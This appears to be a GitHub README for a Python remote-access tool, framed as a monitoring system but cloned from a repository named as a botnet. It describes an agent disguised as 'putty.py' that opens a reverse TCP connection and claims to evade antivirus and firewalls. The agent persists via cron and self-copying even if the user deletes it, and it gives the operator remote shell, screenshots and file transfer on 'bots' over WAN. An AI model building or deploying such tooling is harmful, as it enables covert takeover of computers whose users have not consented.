# INTRODUCTION
----

Centralised Monitoring And Control System(CMCS) is the combination of a remote host handler(MotherNode) and a script(agent) purely written in python that can make other computers slave (client) of the MotherNode.The server script is named server.py and the client script must be administered on remote systems(clients).
The server provides the functionality of simultaneously handling and listening for multiple incoming socket connections.
The code base consists of four client side codes namely

ciscontrols.py **This is for checking few CIS compliance benchmarks.**

client.py **The Client-Side code to initiate a reverse TCP connection**

dependencyclient.sh **A bash script to check all the required dependencies(binaries) are installed or not**

splunkenable.py **To start splunk-forwarder on remote clients to monitor their logs in Splunk-UI**

>This has been made public that anyone can contribute to this project.


# FEATURES
----
- The Server can interact with one client while the MotherNode is still listening for incoming connection from other clients.
- A low level client server model that does not trigger antivirus or firewalls.
- New connections are appended to a table that can be used later.
- The client script(agent) provides feature of persistence on platforms like centos or debian(adding a cronjob in crontab.)
- The script copies itself into the admin folder in the home directory and autoruns on reboot so that it works even if the original file is deleted by user.
- It **works over wan also** provided there is an ip connectivity between the MotherNode and the client.
- Some commands that can be run on the clients are :-



|      COMMAND      | DESCRIPTION                                            |
|:-----------------:|--------------------------------------------------------|
|        exit       | back to mothership(stay connected to the bot)          |
|        help       | see this table                                         |
|     screenshot    | take a screenshot of bot and save to cwd of mothership |
|  shell*<command>  | execute a shell command on bot                         |
|  grab*<file_name> | transfer a file from cwd of bot to cwd of mothership   |
| upload*<filename> | transfer a file from cwd of mothership to cwd of bot   |
|     cd*<path>     | change cwd of bot                                      |
|     status        | get os memory and cpu statistics of remote client      |
|     cischeck      | get current cis complaint status of remote client      |
|     cisenable     | make remote system cis complaint                       |
|     message       | send message to the remote host                        |
|     splunkenable  | enable splunk forwarder on remote host
  
- A user with knowledge of python can write his own functionalities that can be easily incorporated into the existing bots.
- One can easily view the currently connected bots using the showbots command and connect with any one of them using command: ```python connect <index> ```

- User can quit the script safely using the exit command and the bots will go to sleep for 100 sec.After which they will go back to the task of trying to connect back to the mothership.So when the person starts the mothership again his bots will connect back again.
- For reconnaissance the bot table provides the user with ip port and operating system of the bot so that user can use the correct shell commands.

# HOW TO INSTALL
----
## MOTHERSHIP
- To install just open the terminal and type:
```sh 
git clone https://github.com/neiltyagi/AARAGOG-BOTNET.git
```

To launch the mothership go to the installed folder and type
```python
python serverbotnet.py <ip address> <port>
```
THE IP ADDRESS MUST BE YOUR LOCAL IP IF YOU WANT TO USE IN LAN.
TO USE IN WAN USE YOUR GLOBAL IP WITH APPROPRIATE PORT FORWARDING ON THE ROUTER.

>NOTE for best results use the mothership on Kali linux .however it will work on any system with python installed.

## AGENT
>NOTE agent is by the name of putty.py don't rename it to anything other than putty.(required for the persistence functionality

- Open the putty.py file using any text editor
- Edit the IP and port fields to the IP and port you used above
- Save the file.
### TO ADMINISTER ON WINDOWS
Compile the putty.py into a binary with no dependencies using pyinstaller or anyother of your choice.

### TO ADMINISTER ON MAC OSX
For now it is a little tricky but i am working on simplifying it.
the simplest thing you can do right now ,provided the system has python installed is run the script in .py format on the mac system. it will automatically copy itself to the Documents folder and make a cronjob for it to run on every reboot so u don't have to run it  again.



# UPDATES
----
New updates and bug fixes rolling out soon.
